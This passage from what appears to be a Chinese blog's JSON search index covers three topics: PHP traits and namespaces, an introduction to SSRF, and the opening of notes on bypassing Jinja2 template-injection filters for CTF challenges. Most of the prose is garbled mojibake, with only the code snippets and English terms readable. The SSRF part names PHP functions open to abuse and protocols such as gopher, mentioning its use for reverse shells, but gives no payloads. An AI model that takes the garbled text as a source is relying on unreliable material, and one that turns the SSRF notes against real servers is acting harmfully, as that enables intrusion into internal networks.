cup;}$makecup = new tools();$makecup -&gt; water();//-å’Œ&gt;ä¹‹é—´ä¸å¯ä»¥æœ‰ç©ºæ ¼$makecup -&gt; demo();?&gt; å¦‚ä½•åŒæ—¶ä½¿ç”¨å¤šä¸ªtrait 12345678910111213141516171819202122232425262728293031323334&lt;?phptrait test{ function demo() { echo&quot;æ­£åœ¨æµ‹è¯•&quot;; }}trait cup{ use test; function water() { echo 'æˆ‘å¯ä»¥è£…æ°´'; }}trait wan{ function food() { echo&quot;æˆ‘å¯ä»¥è£…é£Ÿç‰©&quot;; }}class tools{ use cup,wan;}$makecup = new tools();$makecup -&gt; water();//-å’Œ&gt;ä¹‹é—´ä¸å¯ä»¥æœ‰ç©ºæ ¼$makecup -&gt; demo();$makecup -&gt; food();?&gt; å¦‚ä½•é¿å…åŒåæ–¹æ³•ï¼Ÿ 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phptrait test{ function demo() { echo&quot;æ­£åœ¨æµ‹è¯•&quot;; }}trait cup{ use test; function water() { echo 'æˆ‘å¯ä»¥è£…æ°´'; } function food() { echo&quot;æˆ‘å¯ä»¥è£…ä¸€ç‚¹ç‚¹é£Ÿç‰©&quot;; }}trait wan{ function food() { echo&quot;æˆ‘å¯ä»¥è£…é£Ÿç‰©&quot;; }}class tools{ use cup,wan { cup::food insteadof wan; }}$makecup = new tools();//$makecup -&gt; water();//-å’Œ&gt;ä¹‹é—´ä¸å¯ä»¥æœ‰ç©ºæ ¼//$makecup -&gt; demo();$makecup -&gt; food();?&gt; è¾“å‡ºç»“æœæ˜¯æˆ‘å¯ä»¥è£…ä¸€ç‚¹ç‚¹é£Ÿç‰©æˆ–è€…å¯ä»¥æ›´æ”¹åå­—æ¥ä½¿ç”¨åŸæœ¬åŒåçš„æ–¹æ³• 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phptrait test{ function demo() { echo&quot;æ­£åœ¨æµ‹è¯•&quot;; }}trait cup{ use test; function water() { echo 'æˆ‘å¯ä»¥è£…æ°´'; } function food() { echo&quot;æˆ‘å¯ä»¥è£…ä¸€ç‚¹ç‚¹é£Ÿç‰©&quot;; }}trait wan{ function food() { echo&quot;æˆ‘å¯ä»¥è£…é£Ÿç‰©&quot;; }}class tools{ use cup,wan { cup::food insteadof wan; wan::food as wafood; }}$makecup = new tools();//$makecup -&gt; water();//-å’Œ&gt;ä¹‹é—´ä¸å¯ä»¥æœ‰ç©ºæ ¼//$makecup -&gt; demo();$makecup -&gt; food();?&gt; ä¸»è¦å°±æ˜¯è¿™äº›äº† æ¥ä¸‹æ¥æ˜¯å‘½åç©ºé—´ namespaceå¯ä»¥å°†å‘½åç©ºé—´ç†è§£ä¸ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥ä¸åŒæ–‡ä»¶å¤¹å°±å¯ä»¥æœ‰ç›¸åŒç±»åã€‚ ç„¶åç¬¬ä¸€ä¸ªå‘½åç©ºé—´å‰ä¸å¯ä»¥æœ‰ä»»ä½•ä»£ç ä¾‹ï¼š 12345678&lt;?php$a=123;namespace hello;class test{}?&gt; å¯¹äºå‘½åç©ºé—´ï¼Œæˆ‘ä»¬æŠŠå…¶ç†è§£ä¸ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å¤¹ ä½•æ—¶ç»ˆæ­¢å‘¢ï¼Œæˆ‘è¿è¡Œä»£ç æ‰€ç”¨çš„å‡½æ•°æ¥è‡ªå“ªä¸ªæ–‡ä»¶å¤¹å‘¢ï¼Ÿ 12345678910111213141516171819202122&lt;?phpnamespace hello;class test{ function train(){ echo'è¿™æ˜¯ä¸€ä¸ªå¤§æµ‹è¯•'; }}namespace world;class test{ function train(){ echo'è¿™æ˜¯ä¸€ä¸ªå°æµ‹è¯•'; }}$a = new test();//æ­¤æ—¶è¿™ä¸ªtestä¾æ—§æ˜¯å±äºä¸‹æ–¹çš„è¿™ä¸ªnamespace$a -&gt; train; //è¿™ä¸ªè¾“å‡ºçš„å€¼ä¸º è¿™æ˜¯ä¸€ä¸ªå°æµ‹è¯• é‚£å¦‚æœæƒ³è¦ä½¿ç”¨çš„namespaceç©ºé—´çš„ç±»å’Œæ–¹æ³•åˆ™éœ€è¦&lt;?php 123456789101112131415161718namespace hello;class test{ function train(){ echo'è¿™æ˜¯ä¸€ä¸ªå¤§æµ‹è¯•'; }}namespace world;class test{ function train(){ echo'è¿™æ˜¯ä¸€ä¸ªå°æµ‹è¯•'; }}$b = new \\hello\\test();//èµ‹äºˆbè¿™ä¸ªtestç±»æ‰€å…·æœ‰çš„å±æ€§æ–¹æ³•$b -&gt; train(); è¿˜å¯ä»¥å¼•å…¥ä¸€ä¸ªå­ç©ºé—´çš„æ¦‚å¿µ,å¦‚ä¸‹é¢ä¾‹å­ï¼Œæ„æ€å°±æ˜¯worldæ–‡ä»¶å¤¹é‡Œé¢çš„TESTæ–‡ä»¶å¤¹ 123456789namespace world\\TEST\\;//å¤šåŠ ä¸€ä¸ªTESTï¼Œåˆ™å¼•å…¥äº†ä¸€ä¸ªå­æ–‡ä»¶å¤¹çš„æ¦‚å¿µæ„å‘³ç€ï¼Œä½ åé¢å¯ä»¥å‘½åworld\\TEST1class test{ function train(){ echo'è¿™æ˜¯ä¸€ä¸ªå°æµ‹è¯•'; }}$b = new \\world\\TEST\\test();//èµ‹äºˆbè¿™ä¸ªtestç±»æ‰€å…·æœ‰çš„å±æ€§æ–¹æ³•$b -&gt; train(); useå’Œasçš„ä½¿ç”¨ç›´æ¥ä¸¾ä¾‹å­å§ï¼Œæ¯”è¾ƒå®¹æ˜“ç†è§£ 12345&lt;?phpinclude 'ä½ çš„phpæ–‡ä»¶åï¼ˆå‡è®¾æ˜¯å­˜æ”¾æœ‰namespaceçš„æ–‡ä»¶ï¼‰';//includeå¯ä»¥å¯¼å…¥æ–‡ä»¶use world\\TEST\\testï¼›$a= new test();$a -&gt; train(); è¿™ä¸ªæ—¶å€™ä½¿ç”¨çš„å°±æ˜¯worldç©ºé—´é‡Œé¢çš„trainï¼Œä½†æ˜¯å¦‚æœæˆ‘åŒæ—¶ç”¨äº†ä¸¤ä¸ªuseå‘¢ 1234567&lt;?phpinclude 'ä½ çš„phpæ–‡ä»¶åï¼ˆå‡è®¾æ˜¯å­˜æ”¾æœ‰namespaceçš„æ–‡ä»¶ï¼‰';//includeå¯ä»¥å¯¼å…¥æ–‡ä»¶ï¼Œåé¢è¦æœ‰å•å¼•å·use world\\TEST\\testï¼›use hello\\testï¼›//è¿™ä¸ªæ—¶å€™æœ‰ä¸¤ä¸ªtestï¼Œ$aæ‰€è¦æ‰§è¡Œçš„teståˆæ— æ³•åˆ†æ¸…äº†ï¼Œæ‰€ä»¥è¦**æ”¹åå­—**$a= new test();$a -&gt; train();?&gt; æ”¹ä¸ºå¦‚ä¸‹ 1234567&lt;?phpinclude 'ä½ çš„phpæ–‡ä»¶åï¼ˆå‡è®¾æ˜¯å­˜æ”¾æœ‰namespaceçš„æ–‡ä»¶ï¼‰';//includeå¯ä»¥å¯¼å…¥æ–‡ä»¶ï¼Œåé¢è¦æœ‰å•å¼•å·use world\\TEST\\test as test1 ï¼›use hello\\test as test2ï¼›// è¿™ä¸ªæ—¶å€™å·²ç»ç”¨asæ›´æ¢åå­—äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„è¿è¡Œå°±å¯ä»¥åˆ†æ¸…æ¥šäº†$a= new test1();$a -&gt; train();?&gt; å¦‚æœä¸æƒ³æ›´æ”¹ç±»åï¼Œé‚£ä¹ˆå°±éœ€è¦æŠŠæ–¹æ³•æ‰€å±çš„ç©ºé—´ä»¥åŠç±»éƒ½å†™ä¸‹æ¥ä»¥ç¤ºåŒºåˆ«ã€‚","link":"/2020/10/18/PHP%E9%AD%94%E6%9C%AF%E5%B8%B8%E9%87%8F%E4%BB%A5%E5%8F%8A%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/"},{"title":"SSRFæ³¨å…¥","text":"ç®€ä»‹ï¼šæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆServer Side Request Forgery, SSRFï¼‰æŒ‡çš„æ˜¯æ”»å‡»è€…åœ¨æœªèƒ½å–å¾—æœåŠ¡å™¨æ‰€æœ‰æƒé™æ—¶ï¼Œåˆ©ç”¨æœåŠ¡å™¨æ¼æ´ä»¥æœåŠ¡å™¨çš„èº«ä»½å‘é€ä¸€æ¡æ„é€ å¥½çš„è¯·æ±‚ç»™æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€‚SSRFæ”»å‡»é€šå¸¸é’ˆå¯¹å¤–éƒ¨ç½‘ç»œæ— æ³•ç›´æ¥è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ ç›¸å…³å±é™©å‡½æ•°1.å‡½æ•°file_get_contents()ã€fsockopen()ã€curl_exec()ã€fopen()ã€readfile()ç­‰å‡½æ•°ä½¿ç”¨ä¸å½“ä¼šé€ æˆSSRFæ¼æ´ ï¼ˆ1ï¼‰.file_get_contentå‡½æ•°ä»ç”¨æˆ·æŒ‡å®šçš„urlè·å–å†…å®¹ï¼Œç„¶åæŒ‡å®šä¸€ä¸ªæ–‡ä»¶åjè¿›è¡Œä¿å­˜ï¼Œå¹¶å±•ç¤ºç»™ç”¨æˆ·ã€‚file_put_contentå‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚ ï¼ˆ2ï¼‰.fsockopenå‡½æ•°å®ç°å¯¹ç”¨æˆ·æŒ‡å®šurlæ•°æ®çš„è·å–ï¼Œè¯¥å‡½æ•°ä½¿ç”¨socketï¼ˆç«¯å£ï¼‰è·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œä¼ è¾“æ•°æ®ã€‚å˜é‡hostä¸ºä¸»æœºåï¼Œportä¸ºç«¯å£ï¼Œerrstrè¡¨ç¤ºé”™è¯¯ä¿¡æ¯å°†ä»¥å­—ç¬¦ä¸²çš„ä¿¡æ¯è¿”å›ï¼Œ30ä¸ºæ—¶é™ ï¼ˆ3ï¼‰.curl_execå‡½æ•°ç”¨äºæ‰§è¡ŒæŒ‡å®šçš„cURLä¼šè¯ 1234561.ä¸€èˆ¬æƒ…å†µä¸‹PHPä¸ä¼šå¼€å¯fopençš„gopher wrapper2.file_get_contentsçš„gopheråè®®ä¸èƒ½URLç¼–ç 3.file_get_contentså…³äºGopherçš„302è·³è½¬ä¼šå‡ºç°bugï¼Œå¯¼è‡´åˆ©ç”¨å¤±è´¥4.curl/libcurl 7.43 ä¸Šgopheråè®®å­˜åœ¨bug(%00æˆªæ–­) ç»æµ‹è¯•7.49 å¯ç”¨5.curl_exec() //é»˜è®¤ä¸è·Ÿè¸ªè·³è½¬ï¼Œ6.file_get_contents() // file_get_contentsæ”¯æŒphp://inputåè®® 2.åè®®ï¼ˆ1ï¼‰fileï¼š åœ¨æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ file åè®®å¯ä»¥è¯»å–ä»»æ„å†…å®¹ï¼ˆ2ï¼‰dictï¼šæ³„éœ²å®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç«¯å£ï¼Œæ“ä½œå†…ç½‘redisæœåŠ¡ç­‰ï¼ˆ3ï¼‰gopherï¼šgopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ã€‚å¯ç”¨äºåå¼¹shellï¼ˆ4ï¼‰http/sï¼šæ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´» Bypasshttps://blog.csdn.net/qq_39101049/article/details/102501839","link":"/2021/03/26/SSRF%E6%B3%A8%E5%85%A5/"},{"title":"sstiæ³¨å…¥ç»•è¿‡æ·±å…¥äº†è§£","text":"å‰è¨€ä¹‹å‰å­¦çš„sstiæ³¨å…¥çœ‹äº†ä¸€ä¸‹åªæ˜¯åœç•™åœ¨å¾ˆè¡¨å±‚çš„å­¦ä¹ ï¼Œæ„Ÿè§‰å·²ç»ä¸èƒ½é€‚åº”ç°åœ¨ctfçš„éš¾åº¦ï¼Œæ•…å†³å®šæ·±å…¥å­¦ä¹ payloadæ„é€ ç»•è¿‡çš„æ–¹å¼ï¼ŒæŒæ¡pythonç¼–å†™è¯­æ³•:Flask/Jinja2 sstiæ³¨å…¥æ­¥éª¤ç¡®å®šæ¨¡æ¿ç±»å‹â€”â€”&gt;é€‰æ‹©å¯¹åº”æ³¨å…¥è¯­å¥ ## Flask/Jingjia2ä½œä¸º webå±‚é¢çš„æ”»å‡»,æˆ‘ä»¬è¦å…³æ³¨è¯­è¨€å±‚é¢çš„ç‰¹æ€§å’Œç»•è¿‡Flask/Jinja2 æ¨¡æ¿çš„è¯­æ³•,filterså’Œå†…å»ºå‡½æ•°,å˜é‡,éƒ½å¯èƒ½ç§°ä¸ºç»•è¿‡çš„trickåŸºæœ¬è¯­æ³•å¦‚ä¸‹:- ``` {{ ... }} for [Expressions](https://jinja.palletsprojects.com/en/2.11.x/templates/#expressions) é‡Œé¢å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼,å¦‚1+1,å­—ç¬¦ä¸²ç­‰,æ”¯æŒè°ƒç”¨å¯¹è±¡çš„æ–¹æ³•,ä¼šæ¸²æŸ“ç»“æœ {% ... %} - for [Statements](https://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-control-structures) ,å¯ä»¥å®ç°for,ifç­‰è¯­å¥,è¿˜æ”¯æŒsetè¯­æ³•,å¯ä»¥ç»™å˜é‡èµ‹å€¼ è¿™é‡Œçš„ {{}} â€‹``` è‡ªç„¶ä¸å¿…è¯´ï¼Œç”¨æ¥æ‰§è¡Œå‘½ä»¤ï¼Œ{%%}æˆ‘çªç„¶æœ‰äº†ç‚¹æ„Ÿè§‰ï¼Œä»–å¯ä»¥ç»™å˜é‡èµ‹å€¼ï¼Œè¿™ä¸å°±è¯´æ˜äº†æˆ‘ä»¬ä½¿ç”¨æ‹¼å‡‘æ³•å—ï¼Œå°±æ˜¯å…ˆå•ç‹¬å¯¹æ¯ä¸ªè¿‡æ»¤é¡¹è¿›è¡Œèµ‹å€¼ï¼Œç„¶åå°†å…¶æ‹¼æ¥èµ·æ¥å°±è¡Œã€‚ ### åŸºç¡€è¯­æ³• #### å˜é‡ åº”ç”¨æŠŠå˜é‡ä¼ é€’ç»™æ¨¡æ¿ï¼Œå¯ä»¥ä½¿ç”¨(.)æ¥è®¿é—®å˜é‡çš„å±æ€§ï¼Œä½œä¸ºæ›¿ä»£ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ‰€è°“çš„ä¸‹æ ‡è¯­æ³•([]) ```{{foo.bar}}{{foo['bar']}}â€‹``` #### è¿‡æ»¤å™¨ å˜é‡å¯ä»¥é€šè¿‡è¿‡æ»¤å™¨ä¿®æ”¹ã€‚ è¿‡æ»¤å™¨ä¸å˜é‡ç”¨**ç®¡é“ç¬¦å·(|)åˆ†å‰²**ï¼Œå¹¶ä¸”ä¹Ÿå¯ä»¥ç”¨åœ†æ‹¬å·ä¼ é€’å¯é€‰å‚æ•°ã€‚ **å¤šä¸ªè¿‡æ»¤å™¨å¯ä»¥é“¾å¼è°ƒç”¨ï¼Œå‰ä¸€ä¸ªè¿‡æ»¤å™¨çš„è¾“å‡ºä¼šè¢«ä½œä¸ºåä¸€ä¸ªè¿‡æ»¤å™¨çš„è¾“å…¥ã€‚** ä¸¾ä¾‹ï¼š {{ name|striptags|title }} ä¼šç§»é™¤ name ä¸­çš„æ‰€æœ‰ HTML æ ‡ç­¾å¹¶ä¸”æ”¹å†™ ä¸ºæ ‡é¢˜æ ·å¼çš„å¤§å°å†™æ ¼å¼ã€‚è¿‡æ»¤å™¨æ¥å—å¸¦åœ†æ‹¬å·çš„å‚æ•°ï¼Œå¦‚åŒå‡½æ•°è°ƒç”¨ã€‚è¿™ä¸ªä¾‹å­ä¼š æŠŠä¸€ä¸ªåˆ—è¡¨ç”¨é€—å·è¿æ¥èµ·æ¥: {{ list|join(', ') }} ã€‚â€‹```#### ç©ºç™½æ§åˆ¶é»˜è®¤é…ç½®ä¸­ï¼Œæ¨¡æ¿å¼•æ“ä¸ä¼šå¯¹ç©ºç™½åšè¿›ä¸€æ­¥ä¿®æ”¹ï¼Œæ‰€ä»¥æ¯ä¸ªç©ºç™½ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ ç­‰ç­‰ï¼‰ï¼Œé…ç½®äº†trim_blocksï¼Œæ¨¡æ¿æ ‡ç­¾åçš„ç¬¬ä¸€ä¸ªæ¢è¡Œç¬¦ä¼šè¢«è‡ªåŠ¨ç§»é™¤é˜²æ­¢-æ­¤å¤–ï¼Œä½ ä¹Ÿå¯ä»¥æ‰‹åŠ¨å‰¥ç¦»æ¨¡æ¿ä¸­çš„ç©ºç™½ã€‚å½“ä½ åœ¨å—ï¼ˆæ¯”å¦‚ä¸€ä¸ª for æ ‡ç­¾ã€ä¸€æ®µæ³¨é‡Šæˆ–å˜ é‡è¡¨è¾¾å¼ï¼‰çš„å¼€å§‹æˆ–ç»“æŸæ”¾ç½®ä¸€ä¸ªå‡å·ï¼ˆ `-` ï¼‰ï¼Œå¯ä»¥ç§»é™¤å—å‰æˆ–å—åçš„ç©ºç™½:**æ ‡ç­¾å’Œå‡å·ä¹‹é—´ä¸èƒ½æœ‰ç©ºç™½** {% - if foo - %}...{% endif %}â€‹``` #### è¡Œè¯­å¥ å¦‚æœåº”ç”¨å¯ç”¨äº†è¡Œè¯­å¥ï¼Œå°±å¯ä»¥æŠŠä¸€ä¸ªè¡Œæ ‡è®°ä¸ºä¸€ä¸ªè¯­å¥ã€‚ä¾‹å¦‚å¦‚æœè¡Œè¯­å¥å‰ç¼€é…ç½®ä¸º#ï¼Œä¸‹é¢çš„ä¾‹å­å°±æ˜¯ç­‰ä»·çš„ã€‚ &lt;ul&gt;# for item in seq &lt;li&gt;{{ item }}&lt;/li&gt;# endfor&lt;/ul&gt;&lt;ul&gt;{% for item in seq %} &lt;li&gt;{{ item }}&lt;/li&gt;{% endfor %}&lt;/ul&gt; **PS:**1.è‹¥æœ‰æœªé—­åˆçš„åœ†æ‹¬å·ã€èŠ±æ‹¬å·æˆ–æ–¹æ‹¬å·ï¼Œè¡Œè¯­å¥å¯ä»¥è·¨è¶Šå¤šè¡Œ: # for href, caption in [('index.html', 'Index'), ('about.html', 'About')]: **2.**##ä¸ºè¡Œæ³¨é‡Šå‰ç¼€ï¼Œè¡Œä¸­æ‰€æœ‰##ä¹‹åçš„å†…å®¹(ä¸åŒ…æ‹¬æ¢è¡Œç¬¦)ä¼šè¢«å¿½ç•¥: #### è½¬ä¹‰ 1.å½“ä»æ¨¡æ¿ä¸­ç”ŸæˆHTMLæ—¶ï¼Œå˜é‡å¯èƒ½åŒ…å«å½±å“å·²ç”Ÿæˆçš„HTMLçš„å­—ç¬¦ã€‚æœ‰ä¸¤ç§è§£å†³æ–¹æ³•ï¼šæ‰‹åŠ¨è½¬ä¹‰æ¯ä¸ªå­—ç¬¦æˆ–é»˜è®¤è‡ªåŠ¨è½¬ä¹‰æ‰€æœ‰çš„ä¸œè¥¿ã€‚2.ä½¿ç”¨æ‰‹åŠ¨è½¬ä¹‰è½¬ä¹‰é€šè¿‡ç”¨ç®¡é“ä¼ é€’åˆ°è¿‡æ»¤å™¨|eæ¥å®ç°: {{user.username|e}}â€‹```#### è¿‡æ»¤å™¨#### èµ‹å€¼åœ¨ä»£ç å—ä¸­ï¼Œä½ ä¹Ÿå¯ä»¥ä¸ºä¸ºå˜é‡èµ‹å€¼ã€‚åœ¨é¡¶å±‚çš„ï¼ˆå—ã€å®ã€å¾ªç¯ä¹‹é—´ï¼‰èµ‹å€¼æ˜¯å¯å¯¼å‡ºçš„ï¼Œå³å¯ä»¥ä»åˆ«çš„æ¨¡æ¿ä¸­å¯¼å…¥ã€‚èµ‹å€¼ä½¿ç”¨setæ ‡ç­¾ï¼Œå¹¶ä¸”å¯ä»¥ä¸ºå¤šä¸ªå˜é‡èµ‹å€¼: {% set navigation = [('index.html', 'Index'), ('about.html', 'About')] %}{% set key, value = call_something() %} #### è¡¨è¾¾å¼jinjiaä¸­å¯¼å…¥éƒ½å…è®¸ä½¿ç”¨åŸºæœ¬è¡¨è¾¾å¼ã€‚è¿™åƒå¸¸è§„çš„pythonä¸€æ ·å·¥ä½œã€‚#### å­—é¢é‡&quot;HELLO&quot;ï¼šåŒå¼•å·æˆ–å•å¼•å·ä¸­é—´çš„ä¸€åˆ‡éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œæ— è®ºä½•æ—¶ä½ éœ€è¦åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²(æ¯”å¦‚å‡½æ•°è°ƒç”¨ã€è¿‡æ»¤å™¨æˆ–åªæ˜¯åŒ…å«æˆ–ç»§æ‰¿ä¸€ä¸ªæ¨¡æ¿çš„å‚æ•°)ã€‚ä»–ä»¬éƒ½æ˜¯æœ‰ç”¨çš„ã€‚42/42.23:ç›´æ¥å†™ä¸‹æ•°å€¼å°±å¯ä»¥åˆ›å»ºæ•´æ•°å’Œæµ®ç‚¹æ•°ã€‚å¦‚æœæœ‰å°æ•°ç‚¹ï¼Œåˆ™ä¸ºæµ®ç‚¹æ•°ï¼Œå¦åˆ™ä¸ºæ•´æ•°ï¼Œåœ¨pythonä¸­ï¼Œ42å’Œ42.0æ˜¯ä¸ä¸€æ ·çš„**dict:**python ä¸­çš„å­—å…¸æ˜¯ä¸€ç§å…³è”é”®å’Œå€¼çš„ç»“æ„ã€‚é”®å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œå¹¶ä¸”é”®å¿…é¡»åªæœ‰ä¸€ä¸ªå€¼ï¼Œå­—å…¸åœ¨æ¨¡æ¿ä¸­å¾ˆå°‘ä½¿ç”¨ï¼Œç½•ç”¨äº**xmlattr()**è¿‡æ»¤å™¨ä¹‹ç±»**PS**æ‰€æœ‰çš„trueå’Œfalseéƒ½æ˜¯å°å†™çš„#### ç®—å¼- ``` Jinja å…è®¸ä½ ç”¨è®¡ç®—å€¼ã€‚è¿™åœ¨æ¨¡æ¿ä¸­å¾ˆå°‘ç”¨åˆ°ï¼Œä½†æ˜¯ä¸ºäº†å®Œæ•´æ€§å…è®¸å…¶å­˜åœ¨ã€‚æ”¯æŒä¸‹é¢çš„ è¿ç®—ç¬¦: - + æŠŠä¸¤ä¸ªå¯¹è±¡åŠ åˆ°ä¸€èµ·ã€‚é€šå¸¸å¯¹è±¡æ˜¯ç´ è´¨ï¼Œä½†æ˜¯å¦‚æœä¸¤è€…æ˜¯å­—ç¬¦ä¸²æˆ–åˆ—è¡¨ï¼Œä½ å¯ä»¥ç”¨è¿™ ç§æ–¹å¼æ¥è¡”æ¥å®ƒä»¬ã€‚æ— è®ºå¦‚ä½•è¿™ä¸æ˜¯é¦–é€‰çš„è¿æ¥å­—ç¬¦ä¸²çš„æ–¹å¼ï¼è¿æ¥å­—ç¬¦ä¸²è§ `~` è¿ç®—ç¬¦ã€‚ `{{ 1 + 1 }}` ç­‰äº `2` ã€‚- ``` - ç”¨ç¬¬ä¸€ä¸ªæ•°å‡å»ç¬¬äºŒä¸ªæ•°ã€‚ `{{ 3 - 2 }}` - ç­‰äº `1` ã€‚ - / å¯¹ä¸¤ä¸ªæ•°åšé™¤æ³•ã€‚è¿”å›å€¼ä¼šæ˜¯ä¸€ä¸ªæµ®ç‚¹æ•°ã€‚ `{{ 1 / 2 }}` - ç­‰äº `{{ 0.5 }}` ã€‚ - // å¯¹ä¸¤ä¸ªæ•°åšé™¤æ³•ï¼Œè¿”å›æ•´æ•°å•†ã€‚ `{{ 20 // 7 }}` ç­‰äº `2` ã€‚ - % è®¡ç®—æ•´æ•°é™¤æ³•çš„ä½™æ•°ã€‚ `{{ 11 % 7 }}` ç­‰äº `4` ã€‚ - * ç”¨å³è¾¹çš„æ•°ä¹˜å·¦è¾¹çš„æ“ä½œæ•°ã€‚ `{{ 2 * 2 }}` ä¼šè¿”å› `4` ã€‚ä¹Ÿå¯ä»¥ç”¨äºé‡ å¤ä¸€ä¸ªå­—ç¬¦ä¸²å¤šæ¬¡ã€‚ `{{ â€˜=â€™ * 80 }}` ä¼šæ‰“å° 80 ä¸ªç­‰å·çš„æ¨ªæ¡ã€‚ - ** å–å·¦æ“ä½œæ•°çš„å³æ“ä½œæ•°æ¬¡å¹‚ã€‚ `{{ 2**3 }}` ä¼šè¿”å› `8` ã€‚ #### æ¯”è¾ƒ- ``` - == æ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸ç­‰ã€‚ - != æ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ä¸ç­‰ã€‚ - &gt; å¦‚æœå·¦è¾¹å¤§äºå³è¾¹ï¼Œè¿”å› true ã€‚ - &gt;= å¦‚æœå·¦è¾¹å¤§äºç­‰äºå³è¾¹ï¼Œè¿”å› true ã€‚ - &lt; å¦‚æœå·¦è¾¹å°äºå³è¾¹ï¼Œè¿”å› true ã€‚ - &lt;= å¦‚æœå·¦è¾¹å°äºç­‰äºå³è¾¹ï¼Œè¿”å› true ã€‚ é€»è¾‘å¯¹äº if è¯­å¥ï¼Œåœ¨ for è¿‡æ»¤æˆ– if è¡¨è¾¾å¼ä¸­ï¼Œå®ƒå¯ä»¥ç”¨äºè”åˆå¤šä¸ªè¡¨è¾¾å¼:- and å¦‚æœå·¦æ“ä½œæ•°å’Œå³æ“ä½œæ•°åŒä¸ºçœŸï¼Œè¿”å› true ã€‚- or å¦‚æœå·¦æ“ä½œæ•°å’Œå³æ“ä½œæ•°æœ‰ä¸€ä¸ªä¸ºçœŸï¼Œè¿”å› true ã€‚- not å¯¹ä¸€ä¸ªè¡¨è¾¾å¼å–åï¼ˆè§ä¸‹ï¼‰ã€‚- (expr) è¡¨è¾¾å¼ç»„ã€‚æç¤º is` å’Œ `in` è¿ç®—ç¬¦åŒæ ·æ”¯æŒä½¿ç”¨ä¸­ç¼€è®°æ³•: `foo is not bar` å’Œ `foo not in bar` è€Œä¸æ˜¯ `not foo is bar` å’Œ `not foo in bar` ã€‚æ‰€æœ‰çš„ å…¶å®ƒè¡¨è¾¾å¼éœ€è¦å‰ç¼€è®°æ³• `not (foo and bar)â€‹```#### å…¶å®ƒè¿ç®—ç¬¦- ``` ä¸‹é¢çš„è¿ç®—ç¬¦éå¸¸æœ‰ç”¨ï¼Œä½†ä¸é€‚ç”¨äºå…¶å®ƒçš„ä¸¤ä¸ªåˆ†ç±»: - in è¿è¡Œåºåˆ—/æ˜ å°„åŒ…å«æ£€æŸ¥ã€‚å¦‚æœå·¦æ“ä½œæ•°åŒ…å«äºå³æ“ä½œæ•°ï¼Œè¿”å› true ã€‚æ¯”å¦‚ `{{ 1 in [1,2,3] }}` ä¼šè¿”å› true ã€‚ - is è¿è¡Œä¸€ä¸ª [*æµ‹è¯•*](http://docs.jinkan.org/docs/jinja2/templates.html#tests) ã€‚ - |**é‡ç‚¹** åº”ç”¨ä¸€ä¸ª [*è¿‡æ»¤å™¨*](http://docs.jinkan.org/docs/jinja2/templates.html#filters) ã€‚ - ~ æŠŠæ‰€æœ‰çš„æ“ä½œæ•°è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”è¿æ¥å®ƒä»¬ã€‚ `{{ &quot;Hello &quot; ~ name ~ &quot;!&quot; }}` ä¼šè¿”å›ï¼ˆå‡è®¾ name å€¼ä¸º `''John'` ï¼‰ `Hello John!` ã€‚ - () è°ƒç”¨ä¸€ä¸ªå¯è°ƒç”¨é‡:`{{ post.render() }}` ã€‚åœ¨åœ†æ‹¬å·ä¸­ï¼Œä½ å¯ä»¥åƒåœ¨ python ä¸­ä¸€æ ·ä½¿ç”¨ä½ç½®å‚æ•°å’Œå…³é”®å­—å‚æ•°: `{{ post.render(user, full=true) }}` ã€‚ - #### . / [] è·å–ä¸€ä¸ªå¯¹è±¡çš„å±æ€§ã€‚ å†…ç½®è¿‡æ»¤å™¨æ¸…å•**abs(number):**è¿”å›å‚æ•°çš„ç»å¯¹å€¼**attr(obj,name):**è·å–å¯¹è±¡çš„å±æ€§ã€‚foo|attr(&quot;bar&quot;)çš„å·¥ä½œæ–¹å¼ç±»ä¼¼äºfoo[&quot;bar&quot;]ï¼Œåªæ˜¯æ€»æ˜¯è¿”å›ä¸€ä¸ªå±æ€§ï¼Œå¹¶ä¸”ä¸æŸ¥æ‰¾ä»»ä½•é¡¹ã€‚**joinï¼ˆvalueï¼Œd=u&quot;,attribute=Noneï¼‰**:è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¯¥å­—ç¬¦ä¸²æ˜¯ç³»åˆ—ä¸­å­—ç¬¦ä¸²çš„ä¸²è”ï¼Œå…ƒç´ 